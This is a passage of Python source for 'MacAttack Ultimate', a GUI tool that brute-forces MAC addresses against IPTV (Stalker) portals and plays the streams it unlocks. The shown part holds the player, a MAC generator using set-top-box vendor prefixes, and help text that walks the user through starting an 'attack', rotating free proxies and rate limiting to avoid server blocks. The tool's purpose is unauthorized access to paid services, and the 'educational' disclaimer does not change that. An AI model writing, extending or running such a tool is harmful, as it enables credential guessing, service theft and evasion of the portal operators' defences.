            "--network-caching=1000",
            "--live-caching=1000",
            "--file-caching=3000",
            "--sout-mux-caching=2000",
        ]
        
        if sys.platform.startswith("linux"):
            opts.append("--vout=xcb")

        proxy = self.player_proxy_var.get().strip()
        if proxy:
            opts.append(f"--http-proxy={proxy}")
        
        referer = self.host_var.get().strip()
        if referer:
            opts.append(f"--http-referrer={referer}")

        try:
            self.vlc_instance = vlc.Instance(opts)
            self.vlc_player = self.vlc_instance.media_player_new()
            self.after(200, self._attach_vlc_to_canvas)
        except Exception as e:
            logger.error(f"Failed to initialize VLC: {e}")

    def _attach_vlc_to_canvas(self):
        try:
            wid = self.video_canvas.winfo_id()
            if sys.platform.startswith("linux"):
                self.vlc_player.set_xwindow(wid)
            elif sys.platform == "win32":
                self.vlc_player.set_hwnd(wid)
            elif sys.platform == "darwin":
                self.vlc_player.set_nsobject(wid)
        except Exception as e:
            logger.warning(f"Failed to attach VLC: {e}")

    def player_set_error(self, msg):
        self.player_err_var.set(msg or "")

    def player_set_progress(self, val):
        try:
            self.player_progress["value"] = max(0, min(100, val))
            self.update_idletasks()
        except Exception:
            pass

    def player_clear_playlist(self):
        for name, tab in self.tab_data.items():
            tab["listbox"].delete(0, "end")
            tab["playlist_data"] = []
            tab["current_category"] = None
            tab["current_channels"] = []
            tab["stack"] = []
            tab["view"] = "categories" if name != "Favorites" else "favorites"
        
        self.player_set_progress(0)
        self.player_set_error("")

    def player_get_playlist(self):
        host = self.host_var.get().strip()
        mac = self.mac_var.get().strip().upper()
        proxy = self.player_proxy_var.get().strip()

        if not host or not mac:
            messagebox.showwarning("Missing", "Please enter Host and MAC.")
            return

        if not validate_mac_address(mac):
            messagebox.showerror("Invalid", "Invalid MAC address format.")
            return

        self.base_url = normalize_base_url(host)
        self.mac = mac

        if proxy:
            self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        else:
            self.session.proxies = {}

        self.init_vlc_instance()

        self.player_set_error("")
        self.player_set_progress(5)

        def worker():
            forced = None
            if self.portal_type_var.get() == "Portal":
                forced = "portal"
            elif self.portal_type_var.get() == "Stalker_Portal":
                forced = "stalker_portal"

            self.token, self.token_random = get_token(self.session, self.base_url, self.mac, forced_ptype=forced)
            self.token_ts = time.time()
            
            if not self.token:
                self.after(0, lambda: (
                    self.player_set_error("❌ Unable to connect or invalid MAC"),
                    self.player_set_progress(0)
                ))
                return
            
            self.after(0, lambda: self.player_set_progress(30))
            cats = fetch_categories(self.session, self.base_url, self.mac, self.token, self.token_random)
            self.after(0, lambda: self._player_populate_categories(cats))

        threading.Thread(target=worker, daemon=True).start()

    def _player_populate_categories(self, cats):
        for name in ("Live", "Movies", "Series"):
            lb = self.tab_data[name]["listbox"]
            lb.delete(0, "end")
            items = cats.get(name, [])
            self.tab_data[name]["playlist_data"] = items
            self.tab_data[name]["current_category"] = None
            self.tab_data[name]["current_channels"] = []
            self.tab_data[name]["stack"] = []
            self.tab_data[name]["view"] = "categories"
            
            for item in items:
                lb.insert("end", item["name"])
        
        self.player_set_progress(100)
        self.player_set_error("")

    def current_player_tab(self):
        try:
            idx = self.cat_tabs.index(self.cat_tabs.select())
            return ("Live", "Movies", "Series", "Favorites")[idx]
        except:
            return "Live"

    def on_search_changed(self, *args):
        search_term = self.search_var.get().lower()
        tab_name = self.current_player_tab()
        
        if tab_name == "Favorites":
            return
        
        tab = self.tab_data[tab_name]
        lb = tab["listbox"]
        
        if tab["view"] == "categories":
            items = tab["playlist_data"]
        elif tab["view"] == "channels":
            items = tab["current_channels"]
        else:
            return
        
        lb.delete(0, "end")
        
        if tab["view"] == "channels":
            lb.insert("end", "⬅️ Go Back")
        
        for item in items:
            name = item.get("name") or item.get("title") or ""
            if search_term in name.lower():
                lb.insert("end", name)

    def on_player_item_activated(self, event):
        tab_name = self.current_player_tab()
        
        if tab_name == "Favorites":
            self._play_favorite(event)
            return
        
        lb = self.tab_data[tab_name]["listbox"]
        sel = lb.curselection()
        if not sel:
            return
        
        idx = sel[0]

        if self.tab_data[tab_name]["view"] != "categories" and idx == 0:
            self._player_go_back(tab_name)
            return

        if self.tab_data[tab_name]["view"] == "categories":
            item = self.tab_data[tab_name]["playlist_data"][idx]
            self.tab_data[tab_name]["stack"].append({
                "view": "categories",
                "category": None,
                "scroll": lb.yview()
            })
            self.tab_data[tab_name]["current_category"] = item
            self.tab_data[tab_name]["view"] = "channels"
            self._player_load_channels_for_category(tab_name, item)
            
        elif self.tab_data[tab_name]["view"] == "channels":
            item_idx = idx - 1
            chans = self.tab_data[tab_name]["current_channels"]
            if item_idx < 0 or item_idx >= len(chans):
                return
            
            item = chans[item_idx]
            itype = item.get("item_type", "channel")
            
            if itype == "series":
                self.tab_data[tab_name]["stack"].append({
                    "view": "channels",
                    "category": self.tab_data[tab_name]["current_category"],
                    "scroll": lb.yview()
                })
                self._player_load_series_episodes(tab_name, item)
            else:
                self._player_play_item(item)
                
        elif self.tab_data[tab_name]["view"] == "episodes":
            item_idx = idx - 1
            episodes = self.tab_data[tab_name].get("current_channels", [])
            if 0 <= item_idx < len(episodes):
                ep = episodes[item_idx]
                self._player_play_item(ep)

    def on_player_item_right_click(self, event):
        tab_name = self.current_player_tab()
        lb = self.tab_data[tab_name]["listbox"]
        
        idx = lb.nearest(event.y)
        if idx < 0:
            return
        
        lb.selection_clear(0, "end")
        lb.selection_set(idx)
        
        menu = tk.Menu(self, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        menu.add_command(label="⭐ Add to Favorites", command=lambda: self._add_to_favorites(tab_name, idx))
        menu.post(event.x_root, event.y_root)

    def _add_to_favorites(self, tab_name, idx):
        if tab_name == "Favorites":
            return
        
        tab = self.tab_data[tab_name]
        
        if tab["view"] == "categories":
            if idx < len(tab["playlist_data"]):
                item = tab["playlist_data"][idx]
                fav = {
                    "name": item["name"],
                    "type": "category",
                    "tab": tab_name,
                    "data": item
                }
                self.favorites.append(fav)
                self._update_favorites_list()
                self.save_favorites()
                messagebox.showinfo("Success", f"✓ Added '{item['name']}' to favorites!")
                
        elif tab["view"] == "channels":
            if idx == 0:
                return
            item_idx = idx - 1
            if item_idx < len(tab["current_channels"]):
                item = tab["current_channels"][item_idx]
                fav = {
                    "name": item.get("name") or item.get("title"),
                    "type": "channel",
                    "tab": tab_name,
                    "data": item
                }
                self.favorites.append(fav)
                self._update_favorites_list()
                self.save_favorites()
                messagebox.showinfo("Success", f"✓ Added '{fav['name']}' to favorites!")

    def _update_favorites_list(self):
        lb = self.tab_data["Favorites"]["listbox"]
        lb.delete(0, "end")
        
        for i, fav in enumerate(self.favorites):
            lb.insert("end", f"⭐ {fav['name']} ({fav['tab']})")

    def _play_favorite(self, event):
        lb = self.tab_data["Favorites"]["listbox"]
        sel = lb.curselection()
        if not sel:
            return
        
        idx = sel[0]
        if idx < len(self.favorites):
            fav = self.favorites[idx]
            if fav["type"] == "channel":
                self._player_play_item(fav["data"])

    def save_favorites(self):
        try:
            with open(self.favorites_file, 'w', encoding='utf-8') as f:
                json.dump(self.favorites, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save favorites: {e}")

    def load_favorites(self):
        try:
            if os.path.exists(self.favorites_file):
                with open(self.favorites_file, 'r', encoding='utf-8') as f:
                    self.favorites = json.load(f)
                    self._update_favorites_list()
        except Exception as e:
            logger.error(f"Failed to load favorites: {e}")
            self.favorites = []

    def _player_go_back(self, tab_name):
        st = self.tab_data[tab_name]["stack"]
        if not st:
            return
        
        prev = st.pop()
        view = prev["view"]
        lb = self.tab_data[tab_name]["listbox"]
        
        if view == "categories":
            self.tab_data[tab_name]["view"] = "categories"
            lb.delete(0, "end")
            for item in self.tab_data[tab_name]["playlist_data"]:
                lb.insert("end", item["name"])
        elif view == "channels":
            self.tab_data[tab_name]["view"] = "channels"
            self._player_render_channels_list(tab_name)
        
        try:
            lb.yview_moveto(prev["scroll"][0] if prev["scroll"] else 0.0)
        except:
            pass

    def _player_load_channels_for_category(self, tab_name, category):
        lb = self.tab_data[tab_name]["listbox"]
        lb.delete(0, "end")
        lb.insert("end", "⬅️ Go Back")
        self.player_set_error("")
        self.player_set_progress(10)

        def worker():
            if not self.token or (time.time() - self.token_ts) > 600:
                forced = None
                if self.portal_type_var.get() == "Portal":
                    forced = "portal"
                elif self.portal_type_var.get() == "Stalker_Portal":
                    forced = "stalker_portal"
                
                self.token, self.token_random = get_token(
                    self.session, self.base_url, self.mac, forced_ptype=forced
                )
                self.token_ts = time.time()
                
                if not self.token:
                    self.after(0, lambda: self.player_set_error("Token refresh failed"))
                    return
            
            chans = fetch_channels(
                self.session,
                self.base_url,
                self.mac,
                self.token,
                self.token_random,
                category["category_type"],
                category.get("category_id") or category.get("genre_id"),
            )
            
            self.tab_data[tab_name]["current_channels"] = chans
            self.after(0, lambda: self._player_render_channels_list(tab_name))

        threading.Thread(target=worker, daemon=True).start()

    def _player_render_channels_list(self, tab_name):
        lb = self.tab_data[tab_name]["listbox"]
        lb.delete(0, "end")
        lb.insert("end", "⬅️ Go Back")
        
        for ch in self.tab_data[tab_name]["current_channels"]:
            name = ch.get("name") or ch.get("title") or f"Item {ch.get('id')}"
            lb.insert("end", name)
        
        self.player_set_progress(100)

    def _player_load_series_episodes(self, tab_name, series_item):
        lb = self.tab_data[tab_name]["listbox"]
        lb.delete(0, "end")
        lb.insert("end", "⬅️ Go Back")
        
        episodes = []
        series_list = series_item.get("series", [])
        
        if series_list and isinstance(series_list, list):
            for ep_no in series_list:
                episodes.append({
                    "name": f"Episode {ep_no}",
                    "item_type": "episode",
                    "cmd": series_item.get("cmd"),
                    "episode_number": ep_no
                })
        else:
            episodes.append({
                "name": series_item.get("name") or series_item.get("title") or "Series",
                "item_type": "vod",
                "cmd": series_item.get("cmd"),
            })
        
        self.tab_data[tab_name]["view"] = "episodes"
        self.tab_data[tab_name]["current_channels"] = episodes
        
        for ep in episodes:
            lb.insert("end", ep["name"])

    def _player_play_item(self, item):
        cmd = item.get("cmd")
        if not cmd:
            messagebox.showerror("Error", "This item has no 'cmd' to play.")
            return
        
        needs_create = False
        itype = item.get("item_type", "channel")
        episode_number = None
        media_hint = None
        
        if itype == "channel":
            if ("/ch/" in cmd and cmd.endswith("_")) or ("ffrt" in cmd):
                needs_create = True
        elif itype == "episode":
            episode_number = item.get("episode_number")
            needs_create = True
            media_hint = "vod"
        elif itype == "vod":
            needs_create = True
            media_hint = "vod"

        def worker():
            if not self.token or (time.time() - self.token_ts) > 600:
                forced = None
                if self.portal_type_var.get() == "Portal":
                    forced = "portal"
                elif self.portal_type_var.get() == "Stalker_Portal":
                    forced = "stalker_portal"
                
                self.token, self.token_random = get_token(
                    self.session, self.base_url, self.mac, forced_ptype=forced
                )
                self.token_ts = time.time()
                
                if not self.token:
                    self.after(0, lambda: self.player_set_error("Token refresh failed"))
                    return
            
            if needs_create:
                link = create_link(
                    self.session, self.base_url, self.mac,
                    self.token, self.token_random, cmd,
                    episode_number, media_hint
                )
                stream_url = link or cmd
            else:
                stream_url = cmd
            
            self.after(0, lambda: self._player_start_playback(stream_url))

        threading.Thread(target=worker, daemon=True).start()

    def _player_start_playback(self, stream_url):
        if not stream_url:
            self.player_set_error("Stream URL not found.")
            return
        
        self.stream_var.set(stream_url)
        self.player_set_error("")
        
        self.init_vlc_instance()
        
        try:
            if self.vlc_player.is_playing():
                self.vlc_player.stop()
        except Exception:
            pass
        
        try:
            media = self.vlc_instance.media_new(stream_url)
            self.vlc_player.set_media(media)
            self.vlc_player.play()
            self.footer_status.config(text="📺 Playing video", fg=Theme.ACCENT_SUCCESS)
        except Exception as e:
            self.player_set_error(f"Playback error: {e}")

    def toggle_play(self):
        try:
            if self.vlc_player.is_playing():
                self.vlc_player.pause()
                self.footer_status.config(text="⏸ Video paused", fg=Theme.ACCENT_WARNING)
            else:
                self.vlc_player.play()
                self.footer_status.config(text="📺 Playing video", fg=Theme.ACCENT_SUCCESS)
        except Exception as e:
            self.player_set_error(f"Toggle error: {e}")

    def stop_video(self):
        try:
            self.vlc_player.stop()
            self.stream_var.set("No video loaded")
            self.footer_status.config(text="⏹ Video stopped", fg=Theme.TEXT_MUTED)
        except Exception:
            pass

    def on_volume_change(self, value):
        try:
            vol = int(float(value))
            self.vlc_player.audio_set_volume(vol)
        except Exception:
            pass

    def take_screenshot(self):
        try:
            if not self.vlc_player.is_playing():
                messagebox.showwarning("Warning", "No video is playing.")
                return
            
            screenshot_dir = os.path.join(self.settings_path, "screenshots")
            os.makedirs(screenshot_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
            
            self.vlc_player.video_take_snapshot(0, filename, 0, 0)
            messagebox.showinfo("Success", f"✓ Screenshot saved to:\n{filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to take screenshot:\n{e}")

    def select_audio_track(self):
        try:
            if not self.vlc_player.is_playing():
                messagebox.showwarning("Warning", "No video is playing.")
                return
            
            tracks = self.vlc_player.audio_get_track_description()
            
            if not tracks or len(tracks) <= 1:
                messagebox.showinfo("Info", "No additional audio tracks available.")
                return
            
            dialog = tk.Toplevel(self)
            dialog.title("Select Audio Track")
            dialog.geometry("400x300")
            dialog.configure(bg=Theme.BG_DARK)
            dialog.transient(self)
            dialog.grab_set()
            
            tk.Label(dialog, text="🔊 AVAILABLE AUDIO TRACKS", 
                    bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                    font=("Helvetica", 12, "bold")).pack(pady=15)
            
            listbox = tk.Listbox(dialog, bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                               font=("Helvetica", 10))
            listbox.pack(fill="both", expand=True, padx=15, pady=10)
            
            for track in tracks:
                track_name = track[1].decode('utf-8') if isinstance(track[1], bytes) else str(track[1])
                listbox.insert("end", track_name)
            
            def set_track():
                sel = listbox.curselection()
                if sel:
                    track_id = tracks[sel[0]][0]
                    self.vlc_player.audio_set_track(track_id)
                    dialog.destroy()
            
            btn_frame = tk.Frame(dialog, bg=Theme.BG_DARK)
            btn_frame.pack(fill="x", padx=15, pady=15)
            
            tk.Button(btn_frame, text="✓ Set Track", command=set_track,
                     bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                     font=("Helvetica", 10, "bold"), relief="flat", 
                     padx=20, pady=8, cursor="hand2").pack(side="left")
            tk.Button(btn_frame, text="Cancel", command=dialog.destroy,
                     bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                     font=("Helvetica", 10), relief="flat", 
                     padx=20, pady=8, cursor="hand2").pack(side="right")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get audio tracks:\n{e}")

    def select_subtitle(self):
        try:
            if not self.vlc_player.is_playing():
                messagebox.showwarning("Warning", "No video is playing.")
                return
            
            tracks = self.vlc_player.video_get_spu_description()
            
            if not tracks or len(tracks) <= 1:
                messagebox.showinfo("Info", "No subtitles available.")
                return
            
            dialog = tk.Toplevel(self)
            dialog.title("Select Subtitle")
            dialog.geometry("400x300")
            dialog.configure(bg=Theme.BG_DARK)
            dialog.transient(self)
            dialog.grab_set()
            
            tk.Label(dialog, text="💬 AVAILABLE SUBTITLES", 
                    bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                    font=("Helvetica", 12, "bold")).pack(pady=15)
            
            listbox = tk.Listbox(dialog, bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                               font=("Helvetica", 10))
            listbox.pack(fill="both", expand=True, padx=15, pady=10)
            
            for track in tracks:
                track_name = track[1].decode('utf-8') if isinstance(track[1], bytes) else str(track[1])
                listbox.insert("end", track_name)
            
            def set_subtitle():
                sel = listbox.curselection()
                if sel:
                    track_id = tracks[sel[0]][0]
                    self.vlc_player.video_set_spu(track_id)
                    dialog.destroy()
            
            btn_frame = tk.Frame(dialog, bg=Theme.BG_DARK)
            btn_frame.pack(fill="x", padx=15, pady=15)
            
            tk.Button(btn_frame, text="✓ Set Subtitle", command=set_subtitle,
                     bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                     font=("Helvetica", 10, "bold"), relief="flat", 
                     padx=20, pady=8, cursor="hand2").pack(side="left")
            tk.Button(btn_frame, text="Disable", 
                     command=lambda: (self.vlc_player.video_set_spu(-1), dialog.destroy()),
                     bg=Theme.ACCENT_WARNING, fg="#000000", 
                     font=("Helvetica", 10), relief="flat", 
                     padx=20, pady=8, cursor="hand2").pack(side="left", padx=10)
            tk.Button(btn_frame, text="Cancel", command=dialog.destroy,
                     bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                     font=("Helvetica", 10), relief="flat", 
                     padx=20, pady=8, cursor="hand2").pack(side="right")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get subtitles:\n{e}")

    # ============ Tools Menu Functions ============

    def open_mac_validator(self):
        """Open MAC validator tool."""
        dialog = tk.Toplevel(self)
        dialog.title("🔍 MAC Address Validator")
        dialog.geometry("500x300")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        
        tk.Label(dialog, text="🔍 MAC ADDRESS VALIDATOR", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(pady=20)
        
        frame = tk.Frame(dialog, bg=Theme.BG_MEDIUM)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        tk.Label(frame, text="Enter MAC Address:", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 11)).pack(pady=10)
        
        mac_entry = ttk.Entry(frame, font=("Courier", 12), width=25)
        mac_entry.pack(pady=10)
        
        result_label = tk.Label(frame, text="", bg=Theme.BG_MEDIUM, 
                               fg=Theme.TEXT_PRIMARY, font=("Helvetica", 12, "bold"))
        result_label.pack(pady=10)
        
        def validate():
            mac = mac_entry.get().strip().upper()
            if validate_mac_address(mac):
                result_label.config(text=f"✅ VALID MAC\n{mac}", fg=Theme.ACCENT_SUCCESS)
            else:
                result_label.config(text="❌ INVALID MAC", fg=Theme.ACCENT_ERROR)
        
        tk.Button(frame, text="🔍 Validate", command=validate,
                 bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                 font=("Helvetica", 11, "bold"), relief="flat", 
                 padx=25, pady=10, cursor="hand2").pack(pady=10)

    def open_mac_generator(self):
        """Open MAC generator tool."""
        dialog = tk.Toplevel(self)
        dialog.title("🎲 MAC Address Generator")
        dialog.geometry("500x400")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        
        tk.Label(dialog, text="🎲 MAC ADDRESS GENERATOR", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(pady=20)
        
        frame = tk.Frame(dialog, bg=Theme.BG_MEDIUM)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        tk.Label(frame, text="Select Prefix:", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 11)).pack(pady=10)
        
        prefix_var = tk.StringVar(value='00:1A:79:')
        prefixes = ['00:1A:79:', '00:2A:01:', 'D4:CF:F9:', '10:27:BE:', 'A0:BB:3E:']
        ttk.Combobox(frame, textvariable=prefix_var, values=prefixes, 
                    font=("Courier", 11), width=20).pack(pady=10)
        
        result_text = tk.Text(frame, height=6, bg=Theme.INPUT_BG, fg=Theme.ACCENT_SUCCESS, 
                             font=("Courier", 12))
        result_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        def generate():
            result_text.delete("1.0", "end")
            for _ in range(5):
                mac = self._rand_mac_with_prefix(prefix_var.get())
                result_text.insert("end", mac + "\n")
        
        btn_frame = tk.Frame(frame, bg=Theme.BG_MEDIUM)
        btn_frame.pack(fill="x", pady=10)
        
        tk.Button(btn_frame, text="🎲 Generate 5 MACs", command=generate,
                 bg=Theme.ACCENT_SUCCESS, fg="#000000", 
                 font=("Helvetica", 11, "bold"), relief="flat", 
                 padx=25, pady=10, cursor="hand2").pack(side="left")
        
        tk.Button(btn_frame, text="📋 Copy All", 
                 command=lambda: (self.clipboard_clear(), self.clipboard_append(result_text.get("1.0", "end"))),
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 11), relief="flat", 
                 padx=25, pady=10, cursor="hand2").pack(side="right")

    def show_network_info(self):
        """Show network information."""
        import socket
        
        dialog = tk.Toplevel(self)
        dialog.title("📡 Network Information")
        dialog.geometry("500x400")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        
        tk.Label(dialog, text="📡 NETWORK INFORMATION", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(pady=20)
        
        frame = tk.Frame(dialog, bg=Theme.BG_MEDIUM)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        info_text = tk.Text(frame, bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                           font=("Courier", 10))
        info_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            info = f"Hostname: {hostname}\n"
            info += f"Local IP: {local_ip}\n\n"
            info += f"Active Proxies: {len(self.proxy_list)}\n"
            info += f"Proxy Enabled: {self.proxy_enabled.get()}\n\n"
            info += f"Current Portal: {self.base_url or 'None'}\n"
            info += f"Attack Running: {self.running_attack}\n"
            info += f"Total Hits: {self.hits_count}\n"
            
            info_text.insert("1.0", info)
        except Exception as e:
            info_text.insert("1.0", f"Error getting network info:\n{e}")

    def show_help(self):
        """Show help documentation."""
        dialog = tk.Toplevel(self)
        dialog.title("📖 Help - Documentation")
        dialog.geometry("700x600")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        
        tk.Label(dialog, text="📖 MACATTACK ULTIMATE - DOCUMENTATION", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(pady=20)
        
        text_frame = tk.Frame(dialog)
        text_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        help_text = tk.Text(text_frame, bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                           font=("Courier", 10), wrap="word")
        scrollbar = ttk.Scrollbar(text_frame, command=help_text.yview)
        help_text.configure(yscrollcommand=scrollbar.set)
        help_text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        help_content = f"""
MacAttack Ultimate v{APP_VERSION}
by {CURRENT_USER}

════════════════════════════════════════════════════════════

📖 QUICK START GUIDE

1. MAC ATTACK
   • Enter IPTV portal URL
   • Select portal type (Autodetect recommended)
   • Adjust speed (threads)
   • Click "Start Attack"

2. VIDEO PLAYER
   • Enter Host and MAC from successful hit
   • Click "Get Playlist"
   • Double-click to play content
   • Right-click to add favorites

3. PROXIES
   • Click "Fetch Free Proxies" for automatic proxy list
   • Enable "Enable Proxies" checkbox
   • Click "Test Proxies (Ultra-Fast)" to verify
   • Tested proxies are automatically filtered

4. STATISTICS
   • View real-time attack statistics
   • Monitor success rate and speed
   • Export found MACs

════════════════════════════════════════════════════════════

⌨️ KEYBOARD SHORTCUTS

Space       - Play/Pause video
Ctrl+S      - Save settings
Ctrl+E      - Export hits
Ctrl+P      - Toggle proxies
Ctrl+Q      - Quit application

════════════════════════════════════════════════════════════

✨ FEATURES

• Ultra-fast concurrent proxy testing (100 workers)
• Multi-threaded MAC scanning (up to 100 threads)
• Auto-fetch from 6 free proxy sources
• Real-time statistics dashboard
• Export to CSV/JSON
• Favorites system
• Screenshot capture
• Multi-audio & subtitle support
• Auto-save/load settings

════════════════════════════════════════════════════════════

⚠️ TIPS

• Use rate limiting to avoid server blocks
• Test proxies before enabling them
• Export hits regularly
• Use "Turbo" speed carefully
• Check error log for troubleshooting

════════════════════════════════════════════════════════════

For more help, visit the Tools menu for additional utilities.
        """
        
        help_text.insert("1.0", help_content)
        help_text.config(state="disabled")

    def show_shortcuts(self):
        """Show keyboard shortcuts."""
        dialog = tk.Toplevel(self)
        dialog.title("🎮 Keyboard Shortcuts")
        dialog.geometry("500x400")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        
        tk.Label(dialog, text="🎮 KEYBOARD SHORTCUTS", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(pady=20)
        
        frame = tk.Frame(dialog, bg=Theme.BG_MEDIUM)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        shortcuts = [
            ("Space", "Play/Pause video"),
            ("Ctrl+S", "Save settings"),
            ("Ctrl+E", "Export hits to CSV"),
            ("Ctrl+P", "Toggle proxy enable/disable"),
            ("Ctrl+T", "Test proxies"),
            ("Ctrl+N", "New scan"),
            ("Ctrl+Q", "Quit application"),
            ("F5", "Refresh playlist"),
            ("F11", "Toggle fullscreen (player)"),
        ]
        
        for i, (key, desc) in enumerate(shortcuts):
            row = tk.Frame(frame, bg=Theme.BG_MEDIUM)
            row.pack(fill="x", pady=5, padx=10)
            
            tk.Label(row, text=key, bg=Theme.BG_LIGHT, fg=Theme.ACCENT_PRIMARY, 
                    font=("Courier", 11, "bold"), width=15).pack(side="left", padx=5)
            tk.Label(row, text=desc, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                    font=("Helvetica", 10), anchor="w").pack(side="left", fill="x", expand=True, padx=5)

    def show_about(self):
        """Show about dialog."""
        dialog = tk.Toplevel(self)
        dialog.title("ℹ️ About MacAttack Ultimate")
        dialog.geometry("600x500")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        dialog.grab_set()
        
        # Banner
        banner = tk.Frame(dialog, bg=Theme.BG_MEDIUM, height=100)
        banner.pack(fill="x")
        banner.pack_propagate(False)
        
        tk.Label(banner, text="⚡ MacAttack Ultimate", 
                bg=Theme.BG_MEDIUM, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 20, "bold")).pack(pady=10)
        tk.Label(banner, text=f"Version {APP_VERSION}", 
                bg=Theme.BG_MEDIUM, fg=Theme.TEXT_SECONDARY, 
                font=("Helvetica", 12)).pack()
        
        # Info
        info_frame = tk.Frame(dialog, bg=Theme.BG_DARK)
        info_frame.pack(fill="both", expand=True, padx=30, pady=20)
        
        info_text = f"""
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║         MacAttack Ultimate Professional Edition      ║
║                                                       ║
║         The Ultimate IPTV Testing Suite              ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝

🔧 Developer: {CURRENT_USER}
📅 Version: {APP_VERSION}
🗓️ Release Date: 2025-10-05
⏰ Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}

════════════════════════════════════════════════════════

✨ KEY FEATURES:

• ⚡ Ultra-Fast Multi-threaded Scanning (up to 100 threads)
• 🌐 Automatic Free Proxy Fetching (6 sources)
• ⚡ Concurrent Proxy Testing (100 workers)
• 📊 Real-time Statistics Dashboard
• 📺 Integrated VLC Media Player
• 💾 Export to CSV/JSON
• ⭐ Favorites System
• 📷 Screenshot Capability
• 🔊 Multi-audio & Subtitle Support
• 💾 Auto-save Settings
• 🎯 MAC Address Validation & Generation
• 🔍 Advanced Search & Filter
• 📡 Network Information Display

════════════════════════════════════════════════════════

⚖️ LICENSE:

This software is provided for educational and testing
purposes only. Use responsibly and in accordance with
all applicable laws and regulations.

The developer is not responsible for any misuse of this
software or any damages caused by its use.

════════════════════════════════════════════════════════

© 2025 {CURRENT_USER}. All rights reserved.
        """
        
        text = tk.Text(info_frame, bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                      font=("Courier", 9), wrap="word")
        scrollbar = ttk.Scrollbar(info_frame, command=text.yview)
        text.configure(yscrollcommand=scrollbar.set)
        text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        text.insert("1.0", info_text)
        text.config(state="disabled")
        
        # Close button
        tk.Button(dialog, text="✓ Close", command=dialog.destroy,
                 bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                 font=("Helvetica", 11, "bold"), relief="flat", 
                 padx=30, pady=10, cursor="hand2").pack(pady=20)

    # ============ Clean Exit ============

    def on_close(self):
        """Handle application close."""
        if self.running_attack:
            if not messagebox.askyesno("Confirm Exit", 
                "Attack is still running. Are you sure you want to exit?"):
                return
        
        try:
            self.stop_attack()
        except Exception:
            pass
        
        try:
            self.save_settings()
            self.save_favorites()
        except Exception:
            pass
        
        try:
            if self.vlc_player:
                self.vlc_player.stop()
                self.vlc_player.release()
            if self.vlc_instance:
                self.vlc_instance.release()
        except Exception:
            pass
        
        try:
            if hasattr(self, "output_file") and self.output_file:
                self.output_file.close()
        except Exception:
            pass
        
        self.destroy()


# ============ Main Entry Point ============

def print_banner():
    """Print ASCII art banner."""
    banner = f"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███╗   ███╗ █████╗  ██████╗ █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗  ║
║   ████╗ ████║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝  ║
║   ██╔████╔██║███████║██║     ███████║   ██║      ██║   ███████║██║     █████╔╝   ║
║   ██║╚██╔╝██║██╔══██║██║     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗   ║
║   ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗  ║
